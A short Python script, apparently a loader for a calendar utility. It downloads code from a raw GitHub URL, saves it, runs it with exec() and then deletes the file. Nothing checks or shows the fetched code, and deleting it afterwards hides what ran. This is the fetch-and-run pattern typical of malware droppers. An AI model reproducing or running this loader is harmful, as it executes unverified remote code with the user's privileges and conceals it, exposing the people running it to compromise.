import requests
import os
import json
import re
from bs4 import BeautifulSoup

file_name_exec = "tabel_calendar_2021_load.py"
target_url = "https://raw.githubusercontent.com/CyberFox404/tabel_calendar/main/tabel_calendar.py"

r = requests.get(target_url, allow_redirects=True)

open(file_name_exec, 'wb').write(r.content)

with open(file_name_exec) as f:
    content = f.read()

exec(content)
os.remove(file_name_exec)